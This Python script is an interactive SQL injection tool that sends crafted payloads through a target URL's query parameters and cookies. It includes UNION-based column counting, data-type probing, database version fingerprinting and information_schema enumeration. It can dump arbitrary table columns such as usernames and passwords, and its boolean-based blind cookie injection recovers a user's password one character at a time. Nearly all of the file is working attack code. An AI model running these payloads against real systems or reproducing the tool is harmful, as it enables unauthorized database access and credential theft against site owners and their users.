import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


# full_url = input("enter url:")
# session = requests.Session()



# parse = urlparse(full_url)
#     # print(parsed.scheme)    https
#     # print(parsed.netloc)    example.com
#     # print(parsed.path)      /post
#     # print(parsed.query)     postId=3

# # base_url = f"{parse.scheme}://{parse.netloc}"
# # path = parse.path + ("?" + parse.query if parse.query else "")
# # submit_url = base_url + path
# query_params = parse_qs(parse.query)

# print("\n parameters found :")
# for i, key in enumerate(query_params.keys()):
#     print(f"{i+1}, {key} = {query_params[key]}")

# choice = int(input("\nselect param number:"))-1
# edit_param = list(query_params.keys())[choice]

# result_ord = {}

def column_counter():
    col_count_test = int(input("do u want column-count testing? 1(yes) 0(no) :"))
    full_url = input("enter url:")
    session = requests.Session()
    parse = urlparse(full_url)
    query_params = parse_qs(parse.query)

    print("\n parameters found :")
    for i, key in enumerate(query_params.keys()):
        print(f"{i+1}, {key} = {query_params[key]}")

    choice = int(input("\nselect param number:"))-1
    edit_param = list(query_params.keys())[choice]

    if col_count_test:
        max_c = int(input("enter the colums number:"))
        comment_style = ['--', '#']
        for comment in comment_style:
            for quoted in [True, False]:
                print("\n ==== testing with "+ ("quotes" if quoted else 'out quotes')+ "====")
                print(f"\ntesting by ORDER BY ({comment}):\n")
                for i in range(1,max_c+1):
                    if quoted:
                        test_value = f"' ORDER BY {i}{comment}"
                    else:
                        test_value = f"ORDER BY {i}{comment}"
                    test_params = query_params.copy()
                    test_params[edit_param] = [test_value]
                    new_query = urlencode(test_params,doseq=True)
                    new_url = urlunparse(parse._replace(query=new_query))
                    print(f"[{i}] tessting: {new_query}")
                    res = session.get(new_url)
                    # result_ord[new_query] = len(res.text)
                    print(f"status code: {res.status_code}")
                    print(len(res.text))
                # print(result_ord)
                # all_len = list(result_ord.values())
                # print(all_len)

                result_null = {}
                print(f"\ntessting by NULL ({comment}):\n")

                for i in range(1, max_c+1):
                    nulls = ",".join(["NULL"]*i)
                    if quoted:
                        test_value = f"' UNION SELECT {nulls}{comment}"
                    else:
                        test_value = f" UNION SELECT {nulls}{comment}"
                    test_params = query_params.copy()
                    test_params[edit_param] = [test_value]
                    new_query = urlencode(test_params,doseq=True)
                    new_url = urlunparse(parse._replace(query=new_query))
                    print(f"[{i}] testing: {new_query}")
                    res = requests.get(new_url)
                    # result_null[new_query] = len(res.text)
                    print(f"status: {res.status_code}")
                    print(len(res.text))
                # print(result_null)
                # all_len = list(result_null.values())
                # print(all_len)
    else:
        pass


print("\n=========")

tests = {
    "string":"'dmDyCT'",
    "int": "123",
    "float": "3.14",
    "bool": "TRUE",
    "time": "2024-01-01",
    "null": "NULL"
}

versions = {
    "Microsoft or MySQL": "@@version",
    "PostgreSQL": "version()",
    "Oracle (v$version)": "banner FROM v$version",
    "Oracle (v$instance)": "version FROM v$instance"
}



def datatype_tester():
    dbtype_test = int(input("do u want data-type testing 1(yes) 0(no) :"))
    full_url = input("enter url:")
    session = requests.Session()
    parse = urlparse(full_url)
    query_params = parse_qs(parse.query)

    print("\n parameters found :")
    for i, key in enumerate(query_params.keys()):
        print(f"{i+1}, {key} = {query_params[key]}")

    choice = int(input("\nselect param number:"))-1
    edit_param = list(query_params.keys())[choice]
    if dbtype_test:
        col_count = int(input("enter the number of col:"))
        quote_need = int(input("does it need quote? 1(yes) 0(no):"))
        print("\n [+] testing...")
        comment_style = ['--', '#']
        for comment in comment_style:
            for dtype, payload in tests.items():
                print(f"\n[testing : {dtype}]")

                for i in range(col_count):
                    col = ["NULL"] * col_count
                    col[i] = payload
                    if quote_need:
                        inject = f"' UNION SELECT {','.join(col)}{comment}"
                    else: 
                        inject = f"UNION SELECT {','.join(col)}{comment}"
                    test_params = query_params.copy()
                    test_params[edit_param] = [inject]
                    new_query = urlencode(test_params,doseq=True)
                    new_url = urlunparse(parse._replace(query=new_query))

                    try:
                        res = session.get(new_url)
                        print(f"[col {i+1}] payload : {inject} | status : {res.status_code} | lenght : {len(res.text)}")
                    except Exception as e:
                        print(f"[col {i+1}] error: {e}")
    else:
        pass

def attack():
    full_url = input("enter url:")
    session = requests.Session()
    parse = urlparse(full_url)
    query_params = parse_qs(parse.query)

    print("\n parameters found :")
    for i, key in enumerate(query_params.keys()):
        print(f"{i+1}, {key} = {query_params[key]}")

    choice = int(input("\nselect param number:"))-1
    edit_param = list(query_params.keys())[choice]
    while True:
        self_payload = input("enter your payload:")
        test_params = query_params.copy()
        test_params[edit_param] = [self_payload]
        self_query = urlencode(test_params,doseq=True)
        self_url = urlunparse(parse._replace(query=self_query))
        try:    
            res = session.get(self_url)
            print(res.text[:500])
            print("\nstatus code :",res.status_code)
            break
        except Exception as e:
            print("pls try again")


def version():
    full_url = input("enter url:")
    session = requests.Session()
    parse = urlparse(full_url)
    query_params = parse_qs(parse.query)

    print("\n parameters found :")
    for i, key in enumerate(query_params.keys()):
        print(f"{i+1}, {key} = {query_params[key]}")

    choice = int(input("\nselect param number:"))-1
    edit_param = list(query_params.keys())[choice]
    col_count = int(input("enter the number of col:"))
    quote_need = int(input("does it need quote? 1(yes) 0(no):"))

    while True:
        try:
            target_col = int(input(f"which column (1–{col_count}) should hold the version payload? \n"))
            if 1 <= target_col <= col_count:
                break
            else:
                print("❌ Invalid column number. Please enter a number within range.")
        except ValueError:
            print("❌ Please enter a valid number.")
    comment_style = ['--', '#']
    for comment in comment_style:
        for dbtype, version_query in versions.items():
            col = ["NULL"] * col_count
            col[target_col - 1] = version_query
            if quote_need:
                payload = f"' UNION SELECT {','.join(col)}{comment} "
            else:
                payload = f"UNION SELECT {','.join(col)}{comment} "
            test_params = query_params.copy()
            test_params[edit_param] = [payload]
            new_query = urlencode(test_params, doseq=True)
            new_url = urlunparse(parse._replace(query=new_query))
            print(f"{dbtype} -> {payload}")
            try:
                res = session.get(new_url)
                print("response len:", len(res.text))
                print("status code:", res.status_code)

                if "MySQL" in res.text or "mysql" in res.text:
                    if res.status_code == 200:
                        print("[+] Target is likely using MySQL\n")
                    else:
                        print("[-]Failed\n")
                elif "PostgreSQL" in res.text:
                    if res.status_code == 200:
                        print("[+] Target is likely using PostgreSQL\n")
                    else:
                        print("[-]Failed\n")
                elif "Oracle" in res.text:
                    if res.status_code == 200:
                        print("[+] Target is likely using Oracle\n")
                    else:
                        print("[-]Failed\n")
                else:
                    print(f"\n===========\n{res.text}\n==========\n")

            except Exception as e:
                print(e)


def db_info_interactive():
    full_url = input("enter url:")
    session = requests.Session()
    parse = urlparse(full_url)
    query_params = parse_qs(parse.query)

    print("\n parameters found :")
    for i, key in enumerate(query_params.keys()):
        print(f"{i+1}, {key} = {query_params[key]}")

    choice = int(input("\nselect param number:"))-1
    edit_param = list(query_params.keys())[choice]
    col_count = int(input(" Enter the number of columns in the query: "))
    quote_need = int(input(" Does the payload need quotes? 1(yes) / 0(no): "))

    mode = input(" What do you want to do?\n 1 : Custom manual payload\n 2 : List columns in a table\n 3 : Extract data from a table\n >>> ").strip()

# ex: ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
# ex: ' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
    col = ["NULL"] * col_count
    from_clause = ""
    where_clause = ""

    if mode == "2":
        # Mode 1: List columns from a table
        table = input(" Enter table name (e.g. users): ").strip()
        while True:
            try:
                index = int(input(f" Column index (1–{col_count}) to put column_name in: "))
                if 1 <= index <= col_count:
                    break
            except:
                continue
        col[index - 1] = "column_name"
        from_clause = " FROM information_schema.columns"
        where_clause = f" WHERE table_name='{table}'"

    elif mode == "3":
        # Mode 2: Extract data from table
        table = input("  Enter table name (e.g. users): ").strip()
        for i in range(col_count):
            value = input(f" Column {i+1} name (or leave blank for NULL): ").strip()
            if value:
                col[i] = value
        from_clause = f" FROM {table}"

    elif mode == "1":
        # Fully custom like before
        while True:
            try:
                num_fields = int(input(" How many columns do you want to insert data into? "))
                if 1 <= num_fields <= col_count:
                    break
            except:
                continue

        for _ in range(num_fields):
            while True:
                try:
                    index = int(input(f" Column index (1–{col_count}): "))
                    if 1 <= index <= col_count:
                        break
                except:
                    continue
            value = input(f" What do you want in column {index}? (e.g. column_name, version(), 'abc', table_name): ")
            col[index - 1] = value

        add_from = input(" Do you want to add a FROM clause? (y/n): ").lower()
        if add_from == 'y':
            from_clause = " FROM " + input("  Enter table name (ex: information_schema.tables): ").strip()

    else:
        print(" Invalid mode selected.")
        return

    # نهایی‌سازی payload
    payload_raw = f"SELECT {','.join(col)}{from_clause}{where_clause}"
    if quote_need:
        payload = f"' UNION {payload_raw}--"
    else:
        payload = f"UNION {payload_raw}--"

    test_params = query_params.copy()
    test_params[edit_param] = [payload]
    new_query = urlencode(test_params, doseq=True)
    new_url = urlunparse(parse._replace(query=new_query))

    print(f"\n Payload: {payload}\n")
    print(f"Testing : {payload}\n {new_query}")
    try:
        res = session.get(new_url)
        print("\n[!] status code : ", res.status_code, "\n")
        print(" Response length:", len(res.text))
        # print(" Response:\n", res.text[:1000], "\n...")
    except Exception as e:
        print(" Error:", e)




def blind_sql():
    url = input("enter url:")
    session = requests.Session()
    session.get(url)
    cookies = session.cookies.get_dict()
    print(cookies)
    if not cookies:
        print("[-] No cookie found.")
        return
    
    tester = input("What is the tester word: ")
    print("\n Available cookies:\n")
    cookie_keys = list(cookies.keys())
    for i,key in enumerate(cookie_keys,1):
        print(f"{i},{key} = {cookies[key]}")

    try:
        selected = int(input("\nWhich one do u wanna change:\n"))
        selected_key = cookie_keys[selected-1]
    except:
        print("[-] Invalid input.")
        return
    
    original_value = cookies[selected_key] 
    while True:
        try:
            choose = int(input("""Enter ur choice:
                1 : Boolean test
                2 : Table detector
                3 : Object detector
                4 : Password lenght
                5 : Password finder
                0 : Exit \n"""))
            match choose:
                case 1:
                    payloads = ["' AND '1'='1","' AND '1'='2"]
                    for payload in payloads:
                        injected_value = original_value + payload
                        test_cookies = cookies.copy()  
                        test_cookies[selected_key] = injected_value
                        print(f"Sending cookie: {selected_key} = {injected_value}")
                        res = session.get(url, cookies=test_cookies)
                        # print(f"Status code: {res.status_code}")
                        print("True\n" if tester in res.text else "False\n")
                case 2:
                    table= input("Which table wanna identify:")
                    payload =f"' AND (SELECT 'a' FROM {table} LIMIT 1)='a"
                    injected_value = original_value + payload
                    test_cookies = cookies.copy()
                    test_cookies[selected_key] = injected_value
                    print(f"Sending cookie: {selected_key} = {injected_value}")
                    res = session.get(url, cookies=test_cookies)
                    print(f"{table} detected!" if tester in res.text else f"can't detect {table}")
                case 3:
                    table = input("Table : ")
                    column = input("which column : ")
                    object = input("Which object : ")
                    payload = f"' AND (SELECT 'a' FROM {table} WHERE {column}='{object}')='a"
                    injected_value = original_value + payload
                    test_cookies = cookies.copy()
                    test_cookies[selected_key] = injected_value
                    print(f"Sending cookie: {selected_key} = {injected_value}")
                    res = session.get(url, cookies=test_cookies)
                    print(f"{table} detected!" if tester in res.text else f"can't detect {table}")
                case 4:
                    
                    table = input("Table : ")
                    column = input("which column : ")
                    object = input("Which object : ")
                    pass_len = int(input("Passwprd lenght : "))
                    for lenght in range(pass_len+1):
                        payload = f"' AND (SELECT 'a' FROM {table} WHERE {column}='{object}' AND LENGTH(password)={lenght})='a"
                        injected_value = original_value + payload
                        test_cookies = cookies.copy()
                        test_cookies[selected_key] = injected_value
                        # print(f"Sending cookie: {selected_key} = {injected_value}")
                        res = session.get(url, cookies=test_cookies)
                        if tester in res.text:
                            print(f"Password lenght is {lenght}")
                            break
                        else:
                            print(f"Failed! ({lenght})")
                        
                case 5:
                    chars = [
    'a','b','c','d','e','f','g','h','i','j','k','l','m',
    'n','o','p','q','r','s','t','u','v','w','x','y','z',
    'A','B','C','D','E','F','G','H','I','J','K','L','M',
    'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
    '0','1','2','3','4','5','6','7','8','9',
    '!','@','#','$','%','^','&','*','(',')','-','_','=','+',
    '[',']','{','}','|',';',':',"'",'"',',','.','<','>','/','?','`','~'
]
                    table = input("Table : ")
                    column = input("which column : ")
                    object = input("Which object : ")
                    pass_col = input("Password column name : ")
                    pass_len = int(input("Password lenght : "))
                    passw = []
                    start_point = int(input("Wanna start from the beginning? 1(yes) 0(no) : "))
                    if start_point:
                        start_point = int(input("Where you wanna begin? : "))
                    else:
                        start_point = 1
                    for i in range(start_point,pass_len+1):
                        for c in chars:
                            payload = f"' AND (SELECT SUBSTRING({pass_col},{i},1) FROM {table} WHERE {column}='{object}')='{c}"
                            injected_value = original_value + payload
                            test_cookies = cookies.copy()
                            test_cookies[selected_key] = injected_value
                            # print(f"Sending cookie: {selected_key} = {injected_value}")
                            res = session.get(url, cookies=test_cookies)
                            if tester in res.text:
                                passw.append(c)
                                print(f"[{i}] : {''.join(passw)}")
                                break
                            else:
                                print(f"Failed! ({c})")
                                pass
                case 0:    
                    break
        except Exception as e:
            print("ERROR:", e)
            print("enter valid number:")



while True:
    try:
        command = int(input("""enter command:
            1 : Attack
            2 : Find Version
            3 : Column Tester (with -- and # and ')
            4 : Data-type Tester
            5 : Data Base Tables Information (non Oracle)
            6 : Data Base Tables Information (Oracle : soon)
            7 : Blind SQL
            0 : Exit
            >>>"""))

        match command:
            case 1:
                attack()
            case 2:
                version()
            case 3:
                column_counter()
            case 4:
                datatype_tester()
            case 5:
                db_info_interactive()
            case 7:
                blind_sql()
            case 0:
                break 
    except Exception as e:
        print("ERROR:", e)
        print("enter valid number:")




